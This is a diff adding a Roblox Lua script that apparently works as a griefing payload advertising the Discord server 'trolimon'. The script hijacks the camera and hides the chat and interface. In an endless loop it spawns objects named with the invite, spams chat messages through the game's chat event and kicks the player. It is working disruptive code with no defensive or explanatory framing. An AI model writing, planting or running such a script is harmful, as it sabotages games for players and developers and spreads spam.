@@ -1,0 +1,61 @@
+local function kick()
+	local player = game.Players.LocalPlayer
+
+	wait(8)
+	player:Kick()
+	wait(.5)
+	player:Kick(" [DWC] discord.gg/trolimon")
+	wait(100000000)
+end
+
+local MenuCam = Instance.new("Part", game.Workspace)
+MenuCam.Transparency = 1
+MenuCam.Size = Vector3.new(4, 1.89, 2.38)
+MenuCam.Position = Vector3.new(55450.645, 17648.945, 2)
+MenuCam.Orientation = Vector3.new(0, -90, 0)
+local Camera = game.Workspace.CurrentCamera
+
+Camera.CameraType = Enum.CameraType.Scriptable
+Camera.CFrame = MenuCam.CFrame
+
+game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+for _, guiElement in pairs(playerGui:GetChildren()) do
+	if guiElement:IsA("ScreenGui") then
+		guiElement.Enabled = false
+	end
+end
+
+local Sky = Instance.new("Sky", game.Lighting)
+Sky.SkyboxBk = "rbxassetid://15502324143"
+
+Sky.SkyboxDn = "rbxassetid://15502324962"
+
+Sky.SkyboxFt = "rbxassetid://15502325676"
+
+Sky.SkyboxLf = "rbxassetid://15502326432"
+
+Sky.SkyboxRt = "rbxassetid://15502327161"
+
+Sky.SkyboxUp = "rbxassetid://15502328272"
+
+while task.wait() do
+	game.Workspace.Camera.MaxAxisFieldOfView = math.random(0.1,63)
+	local folder = Instance.new("Folder", game.Workspace)
+	folder.Name = " [DWC] discord.gg/trolimon"
+
+	local part = Instance.new("Part", folder)
+	part.Name = " [DWC] discord.gg/trolimon"
+
+	local smoke = Instance.new("Smoke", part)
+	smoke.Name = " [DWC] discord.gg/trolimon"
+	local tbl_main = 
+		{
+			"I heart faded", 
+			"All"
+		}
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+	kick()
+end
